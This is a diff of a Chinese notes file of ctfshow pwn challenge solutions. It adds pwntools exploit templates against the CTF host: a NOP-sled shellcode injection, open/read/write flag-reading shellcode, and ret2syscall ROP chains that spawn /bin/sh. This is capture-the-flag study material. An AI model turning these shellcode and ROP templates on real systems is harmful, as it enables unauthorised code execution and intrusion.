@@ -1,5 +1,7 @@
 # ctfshow pwn题解（部分）
 
+## read的系统调用号为0x3,execve的系统调用号为0xb
+
 ## 49 mprotect（32）
 
 一个`mprotect`的题，主要是记一下模板
@@ -116,7 +118,66 @@ p.sendline(payload)
 p.interactive()
 ```
 
-## 68 ORW的板子
+## 68 nop sled(64bit)
+
+#### 有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/68/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+```
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show', 28182)
+#gdb.attach(p)
+
+shellcode = asm(shellcraft.sh())
+payload = b'\x90'*1336 + shellcode
+
+p.recvuntil(": 0x")
+addr = u64(unhex(p.recvline(keepends=False).zfill(16)),endian='big')
+log.info("addr:"+hex(addr))
+p.recvuntil(b"> ")
+p.sendline(payload)
+p.recvuntil(b"> ")
+sh = addr + 668 + 0x35
+log.info("send:"+hex(sh))
+p.sendline(hex(sh))
+
+p.interactive()
+```
+
+## 69 ORW的板子
+
+#### 无Canary，无PIE，有RWX，栈可执行
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/69/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+```
 
 ```python
 from pwn import *
@@ -140,5 +201,146 @@ io.sendline(shellcode)
 io.interactive()
 ```
 
-## read的系统调用号为0x3,execve的系统调用号为0xb
+## 70 ORW的汇编板子
+
+#### 有Canary，无PIE，栈可执行，有RWX，沙盒保护
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/70/pwn'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+```
+
+```python
+#coding:utf-8
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28156)
+#gdb.attach(p)
+
+shellcode = '''
+push 0
+
+mov r15, 0x67616c66	//flag的ascll码形式
+push r15
+mov rdi, rsp
+mov rsi, 0
+mov rax, 2
+syscall		//open("flag",rsp,0)
+
+mov r14, 3
+mov rdi, r14
+mov rsi, rsp
+mov rdx, 0xff
+mov rax, 0
+syscall		//read(3,rsp,0xff)
+
+mov rdi, 1
+mov rsi, rsp
+mov rdx, 0xff
+mov rax, 1
+syscall		//write(1.rsp,oxff)
+'''
+payload = asm(shellcode)
+p.sendline(payload)
+p.interactive()
+```
+
+## 71 ret2syscall(32bit)板子
+
+#### NX开启，无PIE
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/71/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28304)
+#gdb.attach(p)
+
+binsh = 0x80BE408	//能找到binsh
+int_0x80 = 0x08049421
+pop_eax = 0x080bb196	//控制int 0x80
+pop_edx_ecx_ebx = 0x0806eb90	//传3个参数
+payload = b'a'*0x6C+b'b'*0x4
+payload+=p32(pop_eax)+p32(0xb)	//0xb是execve
+payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)	//execve(0,0,"/bin/sh")
+payload+=p32(int_0x80)
+p.sendline(payload)
+p.interactive()
+```
+
+## 72 ret2syscall(32bit,无/bin/sh)板子
+
+#### NX保护开启，无PIE
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/ctfshow/72/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28258)
+#gdb.attach(p)
+
+pop_eax = 0x080bb2c6
+payload = b'a'*0x28+b'b'*0x4
+int_0x80 = 0x0806f350
+#------read-----
+pop_edx_ecx_ebx = 0x0806ecb0
+bss = 0x80EB000
+payload+=p32(pop_eax)+p32(0x3)
+payload+=p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
+payload+=p32(int_0x80)
+#------syscall-------
+payload+=p32(pop_eax)+p32(0xb)
+payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
+payload+=p32(int_0x80)
+p.sendline(payload)
+p.sendline(b'/bin/sh\x00')
+p.interactive()
+```
 
